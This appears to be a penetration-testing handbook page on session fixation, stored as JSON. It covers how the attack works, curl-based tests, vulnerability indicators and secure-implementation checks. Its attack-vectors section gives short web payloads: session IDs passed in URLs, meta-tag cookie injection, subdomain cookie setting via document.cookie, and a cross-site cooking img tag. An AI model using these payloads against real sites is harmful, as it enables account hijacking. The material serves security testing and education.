@@ -1,0 +1,203 @@
+{
+    "title": "Session Fixation",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Attacks",
+            "url": "/enumeration/web"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "How It Works",
+            "type": "ordered_list",
+            "content": [
+                "Attacker obtains a valid session ID from the target site",
+                "Attacker tricks victim into using that session ID",
+                "Victim authenticates with the fixed session",
+                "Attacker uses the same session ID to access victim's account"
+            ]
+        },
+        {
+            "heading": "Testing Methodology",
+            "subheadings": [
+                {
+                    "heading": "Basic Test",
+                    "type": "code_block",
+                    "content": [
+                        "1. Open target.com/login (Attacker browser)",
+                        "2. Note the SESSION cookie value: abc123",
+                        "3. Open target.com/login in incognito (Victim simulation)",
+                        "4. Set cookie to attacker's value: abc123",
+                        "5. Login as victim in incognito tab",
+                        "6. Refresh attacker's browser",
+                        "7. If logged in as victim → VULNERABLE"
+                    ]
+                },
+                {
+                    "heading": "Check if Session Changes on Login",
+                    "type": "code_block",
+                    "content": [
+                        "# Get pre-auth session",
+                        "curl -c cookies.txt https://target.com/login",
+                        "",
+                        "# Check cookie value",
+                        "cat cookies.txt",
+                        "",
+                        "# Login and check if session changed",
+                        "curl -b cookies.txt -c cookies2.txt -X POST \\",
+                        "  -d \"user=test&pass=test\" https://target.com/login",
+                        "",
+                        "# Compare sessions",
+                        "diff cookies.txt cookies2.txt",
+                        "# If same → VULNERABLE"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Attack Vectors",
+            "subheadings": [
+                {
+                    "heading": "Via URL Parameter",
+                    "type": "code_block",
+                    "content": [
+                        "# Some apps accept session in URL",
+                        "https://target.com/login?PHPSESSID=attacker_session",
+                        "https://target.com/login?JSESSIONID=attacker_session",
+                        "https://target.com/login;jsessionid=attacker_session",
+                        "",
+                        "# Send to victim, they login, attacker uses same session"
+                    ]
+                },
+                {
+                    "heading": "Via Meta Tag Injection",
+                    "type": "code_block",
+                    "content": [
+                        "<!-- If XSS or HTML injection exists -->",
+                        "<meta http-equiv=\"Set-Cookie\" content=\"session=attacker_session\">"
+                    ]
+                },
+                {
+                    "heading": "Via Subdomain Cookie",
+                    "type": "code_block",
+                    "content": [
+                        "# If attacker controls subdomain (e.g., user content)",
+                        "# Set cookie from evil.target.com for .target.com",
+                        "document.cookie = \"session=attacker_session; domain=.target.com\""
+                    ]
+                },
+                {
+                    "heading": "Via Cross-Site Cooking",
+                    "type": "code_block",
+                    "content": [
+                        "<!-- On attacker's site, if target has weak cookie scope -->",
+                        "<img src=\"https://target.com/page?session=attacker_session\">"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Indicators of Vulnerability",
+            "type": "table",
+            "headers": [
+                "Indicator",
+                "Status"
+            ],
+            "rows": [
+                {
+                    "Indicator": "Session ID unchanged after login",
+                    "Status": "❌ Vulnerable"
+                },
+                {
+                    "Indicator": "Session accepted via URL parameter",
+                    "Status": "❌ Vulnerable"
+                },
+                {
+                    "Indicator": "No HttpOnly flag on session cookie",
+                    "Status": "⚠️ Risk factor"
+                },
+                {
+                    "Indicator": "Session cookie domain too broad",
+                    "Status": "⚠️ Risk factor"
+                },
+                {
+                    "Indicator": "Long session timeout",
+                    "Status": "⚠️ Risk factor"
+                }
+            ]
+        },
+        {
+            "heading": "Verification Commands",
+            "type": "code_block",
+            "content": [
+                "# Check cookie attributes",
+                "curl -v -c - https://target.com/login 2>&1 | grep -i \"set-cookie\"",
+                "",
+                "# Look for:",
+                "# - HttpOnly flag (mitigates but doesn't prevent)",
+                "# - Secure flag",
+                "# - SameSite attribute",
+                "# - Domain scope"
+            ]
+        },
+        {
+            "heading": "Secure Implementation (What to Look For)",
+            "type": "code_block",
+            "content": [
+                "✓ Generate new session ID after authentication",
+                "✓ Invalidate old session on login",
+                "✓ Use HttpOnly and Secure flags",
+                "✓ Implement SameSite=Strict or Lax",
+                "✓ Reject session IDs from URL parameters",
+                "✓ Short session timeouts"
+            ]
+        },
+        {
+            "heading": "Related Topics",
+            "type": "list",
+            "content": [
+                "XSS - Can be used to set cookies",
+                "CSRF - Related session attacks",
+                "Authentication Bypass"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2026-02-03T14:05:45.496Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/session-fixation.md",
+        "previous_page": {
+            "title": "Web Cache Deception",
+            "url": "/enumeration/web/web-cache-deception"
+        },
+        "next_page": {
+            "title": "Email attacks",
+            "url": "/enumeration/web/email-attacks"
+        }
+    }
+}
